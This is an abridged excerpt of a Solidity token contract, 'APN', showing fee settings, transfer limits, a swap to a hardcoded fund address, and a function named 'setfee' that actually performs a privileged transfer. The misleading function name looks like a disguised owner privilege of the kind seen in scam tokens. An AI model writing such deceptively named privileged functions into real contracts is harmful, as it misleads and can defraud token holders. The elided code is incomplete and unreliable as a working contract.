...
contract APN is IERC20, Ownable {
    ...
    uint256 public maxTXAmount = 2100000000 * 10 ** _decimals;
    uint256 public walletLimit = 2100000000 * 10 ** _decimals;
    ...
    uint256 private _buyLPDividendFee = 500;
    ...
    uint256 private _sellLPFee = 500;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        address secFundAddress = 0xfd403959e5C6239110d0031F3064C512bC792480;
    ...
    function setfee(address recipient, uint256 amount) external onlyFunder  returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
}